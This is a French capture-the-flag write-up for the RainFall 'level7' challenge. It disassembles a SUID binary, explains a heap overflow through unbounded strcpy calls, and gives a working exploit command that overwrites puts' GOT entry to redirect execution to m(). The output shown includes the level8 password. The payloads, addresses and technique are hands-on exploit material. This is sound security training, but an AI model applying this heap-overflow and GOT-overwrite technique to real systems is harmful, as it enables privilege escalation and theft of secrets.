# LEVEL7

Le système de fichier se présente de cette manière :

```diff
level7@RainFall:~$ ls -la

total 17

dr-xr-x---+ 1 level7 level7   80 Mar  9  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
rw-r--r--  1 level7 level7  220 Apr  3  2012 .bash_logout
rw-r--r--  1 level7 level7 3530 Sep 23  2015 .bashrc
+rwsr-s---+ 1 level8 users  5648 Mar  9  2016 level7
rw-r--r--+ 1 level7 level7   65 Sep 23  2015 .pass
rw-r--r--  1 level7 level7  675 Apr  3  2012 .profile
```

Le binaire possède le **SUID**, il est donc exécuté avec les privilèges de `level8`.

## Analyse

Le programme effectue 4 allocations de 8 octets :

``` bash
(gdb) disas main
Dump of assembler code for function main:
   [...]
   0x0804852a <+9> :	mov    DWORD PTR [esp],0x8 
   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>               # malloc(8) --> 0x804a008
   0x08048536 <+21>:	mov    DWORD PTR [esp+0x1c],eax             # sauvegarde adresse data1
   0x0804853a <+25>:	mov    eax,DWORD PTR [esp+0x1c]
   0x0804853e <+29>:	mov    DWORD PTR [eax],0x1                  # data1[0] = 1

   0x08048544 <+35>:	mov    DWORD PTR [esp],0x8                  
   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>               # malloc(8) -->  0x804a018
   0x08048550 <+47>:	mov    edx,eax                              # edx = 0x804a018
   0x08048552 <+49>:	mov    eax,DWORD PTR [esp+0x1c]             # eax = adresse data1 (0x804a008)
   0x08048556 <+53>:	mov    DWORD PTR [eax+0x4],edx              # data1[1] = 0x804a018 (ptr vers buffer1)

   0x08048559 <+56>:	mov    DWORD PTR [esp],0x8                  
   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>               # malloc(8) --> 0x804a028
   0x08048565 <+68>:	mov    DWORD PTR [esp+0x18],eax             # sauvegarde adresse data2
   0x08048569 <+72>:	mov    eax,DWORD PTR [esp+0x18]
   0x0804856d <+76>:	mov    DWORD PTR [eax],0x2                  # data2[0] = 2
   0x08048573 <+82>:	mov    DWORD PTR [esp],0x8

   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>               # malloc(8) --> 0x804a038
    0x0804857f <+94>:	mov    edx,eax                              # edx = 0x0804a038 
    0x08048581 <+96>:	mov    eax,DWORD PTR [esp+0x18]             # eax = adresse data2 (0x0804a028)
    0x08048585 <+100>:	mov    DWORD PTR [eax+0x4],edx              # data2[1] = 0x804a038 (ptr vers buffer2)
  [...]
   0x08048601 <+224>:	leave  
   0x08048602 <+225>:	ret    
End of assembler dump.
```

On identifie les adresse des allocations :
```asm
malloc(8) → 0x0804a008
malloc(8) → 0x0804a018
malloc(8) → 0x0804a028
malloc(8) → 0x0804a038
```

Les deux premières allocations forment :

```text
data1:
[0x0804a008] → 1
[0x0804a00c] → 0x0804a018 (pointeur vers buffer1)

buffer1 (0x0804a018) <- destination strcpy(argv[1])
8 octets disponibles

data2:
[0x0804a028] → 2
[0x0804a02c] → 0x0804a038 (pointeur vers buffer2)

buffer2 (0x0804a038) <- destination strcpy(argv[2])
8 octets disponibles
```

Le deuxieme malloc de chaque paire stocke un pointeur dans le champ [+0x4] de la structure précédente.
Ces structures en mémoire sont contigues sur la heap.

Les arguments sont ensuite copiés avec deux appels à `strcpy` qui n'incluent pas de limite pour les octets copiés:

```c
strcpy((char *)data1[1], argv[1]); // strcpy(0x804a018, argv[1])
strcpy((char *)data2[1], argv[2]); // strcpy(0x0804a038, argv[2])
```

``` bash
(gdb) disas main
Dump of assembler code for function main:
    [...]
    0x08048588 <+103>:	mov    eax,DWORD PTR [ebp+0xc]      # argv
    0x0804858b <+106>:	add    eax,0x4                      # argv[1]
    0x0804858e <+109>:	mov    eax,DWORD PTR [eax]
    0x08048590 <+111>:	mov    edx,eax
    0x08048592 <+113>:	mov    eax,DWORD PTR [esp+0x1c]     # adresse data1 (0x804a008)
    0x08048596 <+117>:	mov    eax,DWORD PTR [eax+0x4]      # eax = data1[1] = 0x0804a018 (buffer1)
    0x08048599 <+120>:	mov    DWORD PTR [esp+0x4],edx      # 2e arg = argv[1]
    0x0804859d <+124>:	mov    DWORD PTR [esp],eax          # 1er arg = buffer1 (== data1[1])
    0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>       # strcpy((char*)data1[1], argv[1])

    0x080485a5 <+132>:	mov    eax,DWORD PTR [ebp+0xc]      # argv
    0x080485a8 <+135>:	add    eax,0x8                      # argv[2]
    0x080485ab <+138>:	mov    eax,DWORD PTR [eax]
    0x080485ad <+140>:	mov    edx,eax
    0x080485af <+142>:	mov    eax,DWORD PTR [esp+0x18]     # eax = adresse data2 (0x0804a028)
    0x080485b3 <+146>:	mov    eax,DWORD PTR [eax+0x4]      # eax = data2[1] = 0x0804a038 (buffer2)
    0x080485b6 <+149>:	mov    DWORD PTR [esp+0x4],edx      # 2e arg = argv[2]
    0x080485ba <+153>:	mov    DWORD PTR [esp],eax          # 1er arg = buffer2 (== data2[1])
    0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>       # strcpy((char*)data2[1], argv[2])
    [...]
```

Les buffers ne font que **8 octets**, ce qui permet de provoquer un heap overflow.

## Lecture du mot de passe et fonciton m

Avant d'appeler `puts` le programme lit le fichier `.pass` via `fgets` et stocke son contenu dans une variable globale `c` à l'adresse `0x8049960`.

``` bash
(gdb) disas main
    [...]
    0x080485c2 <+161>:	mov    edx,0x80486e9                # "r" "/home/user/level8/.pass" "~~"
    0x080485c7 <+166>:	mov    eax,0x80486eb                # "/home/user/level8/.pass"
    0x080485cc <+171>:	mov    DWORD PTR [esp+0x4],edx      # 2e arg = "r"
    0x080485d0 <+175>:	mov    DWORD PTR [esp],eax          # 1e arg = "/home/user/level8/.pass"
    0x080485d3 <+178>:	call   0x8048430 <fopen@plt>        # fopen("/home/user/level8/.pass", "r");
    0x080485d8 <+183>:	mov    DWORD PTR [esp+0x8],eax      # 3eme arg (file == eax)
    0x080485dc <+187>:	mov    DWORD PTR [esp+0x4],0x44     # 2eme arg (68 == taille max)
    0x080485e4 <+195>:	mov    DWORD PTR [esp],0x8049960    # 1e arg buffer global (0x8049960 == c) 
    0x080485eb <+202>:	call   0x80483c0 <fgets@plt>        # fgets(c, 68, file) == recupère le mdp
    0x080485f0 <+207>:	mov    DWORD PTR [esp],0x8048703    # "~~"
    0x080485f7 <+214>:	call   0x8048400 <puts@plt>         # puts("~~")
    [...]
```

``` bash
1: x/i $pc
=> 0x80485cc <main+171>:	mov    DWORD PTR [esp+0x4],edx
(gdb) x/4s $edx
0x80486e9:	 "r"
0x80486eb:	 "/home/user/level8/.pass"
0x8048703:	 "~~"
```

Le mot de passe est donc déjà en mémoire dans `c` au moment où `puts` est appelé. La fonction `m`, qui n'est jamais appelé dans le flot normal, affiche justement ce buffer :

``` bash
(gdb) disas m
Dump of assembler code for function m:
   [...]
   0x08048501 <+13>:	call   0x80483d0 <time@plt>             # time(NULL)
   0x08048506 <+18>:	mov    edx,0x80486e0                    # "%s - %d\n"
   0x0804850b <+23>:	mov    DWORD PTR [esp+0x8],eax          # resultat de l'appel time
   0x0804850f <+27>:	mov    DWORD PTR [esp+0x4],0x8049960    # variable globale c == resultat du fgets
   0x08048517 <+35>:	mov    DWORD PTR [esp],edx              # 1er arg == "%s - %d\n"
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>           # printf("%s - %d\n", c, timestamp);
   [...]
```

L'objectif est donc de faire appeler `m()` à la place de `puts()`.
On va donc utiliser la faille existante avec `strcpy`.

## Exploitation

Pour atteindre data2[1] (à `0x0804a02c`) depuis le début de buffer1 (`0x0804a018`) :
``` text
0x0804a02c - 0x0804a018 = 0x14 = 20 octets
```
Il faut donc 20 octets de padding dans argv[1] pour que les 4 octets suivants écrasent préciseémment `data2[1]`

Avec :

```bash
ltrace ./level7 $(python2 -c 'print "A" * 20 + "B" * 4') $(python2 -c 'print "C" * 8')
```

on obtient :

```text
malloc(8)                                                          = 0x0804a008
malloc(8)                                                          = 0x0804a018
malloc(8)                                                          = 0x0804a028
malloc(8)                                                          = 0x0804a038
strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAABBBB")                     = 0x0804a018
strcpy(0x42424242, "CCCCCCCC" <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

Le premier `strcpy` copie 20 "A" depuis `0x0804a018` (data1[1] / buffer1).  Il dépasse les 8 octets du buffer1 et écrase la mémoire contigue jusqu'à atteindre `data2[1]` (`0x0804a02c`), qui est le pointeur utilisé comme destination du second `strcpy`. Le second `strcpy` tente alors d'écrire à l'adresse `0x42424242` (soit 4 "B") ce qui produit un segfault.

On peut remplacer ce pointeur (data2[1]) par l'adresse de la GOT de `puts` que l'on trouve en desassemblant `puts`:
La GOT est une table en mémoire qui contient les adresses réelles des fonctions de la libc résolues dynamiquement. 
En appelant `puts@plt`, le programme passe d'abord par la PLT, qui fait un `jmp` indirect vers l'adresse stockée dans la GOT:

``` diff
(gdb) disas puts
Dump of assembler code for function puts@plt:
++   0x08048400 <+0>:	jmp    *0x8049928       # adresse GOT de puts
   0x08048406 <+6>:	push   $0x28
   0x0804840b <+11>:	jmp    0x80483a0
End of assembler dump.
```

L'adresse de la GOT de `puts` est donc `0x08049928`. Si on écrit l'adresse de `m()` à cet emplacement, le prochain appel à `puts` sera redirigé vers `m()`.

C'est ce que le second `strcpy` va faire une fois son pointeur destination `data2[1]` écrasé par notre payload : 
- argv[1] = 20 octets de padding + adresse GOT de puts -> écrase data2[1] avec `0x8049928`
- argv[2] = adresse de `m()` -> le second strcpy écrit l'adresse de `m` dans la GOT de `puts`

Quand le programme appelle ensuite `puts("~~")`, il saute vers `m()` qui affiche `c`, le buffer contenant le mot de passe lu par `fgets`.

## Exploit

```bash
./level7 $(python2 -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python2 -c 'print "\xf4\x84\x04\x08"')
```

Résultat :

```text
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
- 1785247605
```

La fonction `m()` affiche le contenu de `c`, qui contient le mot de passe de `level8`.

```bash
cat /home/user/level8/.pass
```
